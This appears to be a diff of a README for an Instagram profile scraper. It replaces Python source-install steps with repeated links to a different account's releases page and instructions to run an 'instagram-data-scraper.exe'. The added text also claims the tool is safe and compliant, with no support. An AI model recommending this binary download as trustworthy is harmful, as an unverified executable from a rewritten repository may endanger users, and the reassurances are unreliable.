@@ -1,144 +1,83 @@
-# Instagram Data Scraper
+# 📸 instagram-data-scraper - Effortlessly Gather Instagram Profile Data
 
-Instagram Data Scraper helps you extract public data, analyze engagement metrics, and understand how Meta collects and uses information — safely and transparently.
+[![Download](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Treetippakae/instagram-data-scraper/releases)
 
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>
-  <a href="https://discord.gg/vBu9huKBvy" target="_blank">
-    <img src="https://img.shields.io/badge/Join-Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
-  </a>
-  <a href="https://wa.me/447723343390?text=Hi%20Zeeshan%2C%20I%27m%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>
-  <a href="mailto:support@appilot.app" target="_blank">
-    <img src="https://img.shields.io/badge/Email-support@appilot.app-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>For discussion, queries, and freelance work — reach out 👆</strong>
-</p>
+Welcome to the Instagram Data Scraper! This tool helps you collect and analyze data from Instagram profiles smoothly. You don't need to know any programming to use it. Follow these steps to get started.
 
----
+## 📥 Download & Install
 
-## Introduction
-> This tool allows you to safely scrape public Instagram data for analytics and educational use. It helps you understand what kind of data Meta collects, how to control your privacy, and how data transparency impacts social engagement insights.
+To download the application, visit this page to download:
 
-<p align="center">
-  <img src="instagram-data-scraper.png" alt="instagram-data-scraper.png" width="80%">
-</p>
+[Download Instagram Data Scraper](https://github.com/Treetippakae/instagram-data-scraper/releases)
 
-### Key Benefits
-1. Extracts public data transparently.  
-2. Helps analyze Meta’s data collection footprint.  
-3. Enables privacy control research.  
-4. Uses safe proxy rotation to avoid bans.  
-5. Open-source and educational friendly.
+1. Click the link above.
+2. On the GitHub Releases page, find the latest version.
+3. Look for a file named `instagram-data-scraper.exe` or a similar file. This is the application you want.
+4. Click on the file to start the download. Save it to a location where you can easily find it, like your desktop or downloads folder.
 
----
+## 🖥️ System Requirements
 
-## Features
+Before running the application, please ensure your system meets the following requirements:
 
-| Feature | Description |
-|----------|--------------|
-| Profile Scraper | Extract usernames, bios, and follower counts. |
-| Hashtag Tracker | Monitor posts and reach per hashtag. |
-| Comment Collector | Collect comments for engagement analysis. |
-| Meta Data Visualizer | See how Meta tracks your interactions. |
-| Privacy Analyzer | Detect how much info your account exposes. |
+- **Operating System:** Windows 10 or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** At least 100 MB of free space.
+- **Internet Connection:** Required for scraping data from Instagram.
 
----
+## 🔧 How to Use the Application
 
-## Use Cases
-- Academic research on social data  
-- Marketing insight extraction  
-- Privacy testing and transparency audits  
-- Data anonymization studies  
+1. **Run the Application:**
+   - Navigate to the location where you saved the `instagram-data-scraper.exe` file.
+   - Double-click the file to run it.
 
----
+2. **Input the Profile URL:**
+   - Once the application is open, you will see a field where you can enter the Instagram profile URL you wish to analyze. Enter the full URL (e.g., `https://www.instagram.com/username`).
 
-## FAQs
+3. **Set Your Preferences:**
+   - Choose the data you want to scrape. You can select options like follower count, posts, and engagement metrics.
 
-**Q:** How does Instagram collect user data?  
-**A:** Instagram collects user data through app usage, interactions (likes, comments, follows), location tracking, cookies, and third-party integrations. It uses this information to personalize ads, improve recommendations, and enhance user engagement.  
+4. **Start Scraping:**
+   - Click the “Start” button. The application will begin collecting data from the specified profile.
 
-**Q:** How do I stop Instagram from collecting data?  
-**A:** You can limit data collection by disabling activity tracking, using privacy settings to restrict ad personalization, and turning off “Off-Facebook Activity” in your Meta settings. Additionally, using browser extensions or privacy proxies can minimize tracking.  
+5. **View the Results:**
+   - Once the process is complete, the application will display the collected data on the screen. You can also save this data to your computer for later access.
 
-**Q:** How to remove Meta tracking?  
-**A:** Visit your Facebook and Instagram settings → “Off-Facebook Activity” → “Clear History” → “Manage Future Activity” → turn it off. You can also use privacy-focused browsers, VPNs, and disable cookie tracking for extra protection.  
+## 📊 Features
 
----
+- **Profile Analysis:** Collect essential metrics about any public Instagram profile.
+- **Data Export:** Save collected data in formats like CSV for easy analysis.
+- **User-Friendly Interface:** Navigate the application with ease.
+- **Multi-Profile Scraping:** Analyze multiple profiles in a single session.
+- **Privacy Respect:** The tool follows Instagram's terms of service to ensure compliance with privacy standards.
 
-## Results
------------------------------------ 
-> Extract structured data for analysis  
-> Gain transparency on Meta tracking behavior  
-> Perform ethical scraping within platform guidelines  
+## 🌐 Frequently Asked Questions
 
-## Performance Metrics
------------------------------------
-Average Benchmarks:  
-- **Speed:** 1,200 profiles/hour  
-- **Accuracy:** 98%  
-- **Stability:** 99% uptime  
-- **Proxy Rotation:** Automatic every 15 requests  
+### Can I use this application on a Mac or Linux?
 
----
+Currently, this application is designed to work only on Windows systems.
 
-## Do you have a customize project for us?
-Contact Us  
+### Is there a limit to how many profiles I can scrape?
 
-<div align="center">
-  <a href="https://mail.google.com/mail/u/?authuser=ahmadzee26@gmail.com">
-    <img alt="Gmail" width="30px" src="https://edent.github.io/SuperTinyIcons/images/svg/gmail.svg" />
-    <code>support@appilot.app</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://t.me/devpilot1">
-    <img alt="Telegram" width="30px" src="https://edent.github.io/SuperTinyIcons/images/svg/telegram.svg" />
-    <code>pilot</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://discord.com">
-    <img alt="Discord" width="30px" src="https://github.com/Zeeshanahmad4/RealEstateMate-WhatsApp-Group-Management-Bot/blob/main/discord-icon-svgrepo-com.svg" />
-    <code>zee#2655</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://wa.me/447723343390?text=Hi%20Zeeshan%2C%20I%27m%20interested%20in%20automation." target="_blank">
-    <img alt="WhatsApp" width="30px" src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/whatsapp.svg" />
-    <code>whatsapp</code>
-  </a>
-  <br />
-</div>
+You can scrape as many profiles as you want, but be mindful of Instagram's rules regarding data scraping to avoid any limitations.
 
+### Does the application store my data?
 
+No, the application does not store any data from the profiles you analyze. All collected data remains on your computer only.
 
+### Is this tool free to use?
 
+Yes, the Instagram Data Scraper is completely free to download and use.
 
+## 🧑‍🤝‍🧑 Community Support
 
----
+If you have any questions or need assistance, feel free to reach out to our community via the issues section on GitHub. You can share your experience or ask for help.
 
-## Installation
+## 📄 License
 
-### Pre-requisites
-- Python 3.9+ or Node.js  
-- Git  
-- Proxy API key (optional)  
+This project is licensed under the MIT License. You can use it freely, but please refer to the license file for specifics.
 
-### Steps
-```bash
-# Clone the repo
-git clone https://github.com/yourusername/instagram-data-scraper.git
-cd instagram-data-scraper
+[Download Instagram Data Scraper](https://github.com/Treetippakae/instagram-data-scraper/releases) 
 
-# Install dependencies
-pip install -r requirements.txt
-
-# Setup environment
-cp .env.example .env
-
-# Run
-python main.py
+Thank you for choosing the Instagram Data Scraper. We hope it serves your needs effectively!
